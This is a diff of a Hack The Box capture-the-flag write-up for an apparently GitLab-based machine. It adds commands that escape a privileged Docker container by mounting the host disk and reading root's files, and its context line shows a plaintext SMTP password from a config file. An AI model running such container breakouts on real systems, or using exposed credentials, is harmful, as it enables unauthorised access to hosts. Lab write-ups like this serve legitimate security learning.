@@ -100,9 +100,22 @@ gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
 
 > * Now i'm in docker, so i need to escape to esclate my priviliges.
 
+> * Found this useful [blog](https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1).
+
+```html
+mkdir /tmp/y4h1a
+mount /dev/sda2 /tmp/y4h1a
+mount /dev/sda2 y4h1a
+cat /tmp/y4h1a/root/root.txt
+```
 
 
-![]()
+
+![](https://i.ibb.co/4jL8HfK/image.png)
+
+# RooTed
+
+<img src="http://www.hackthebox.eu/badge/image/209461" alt="Hack The Box">
 ![]()
 
 
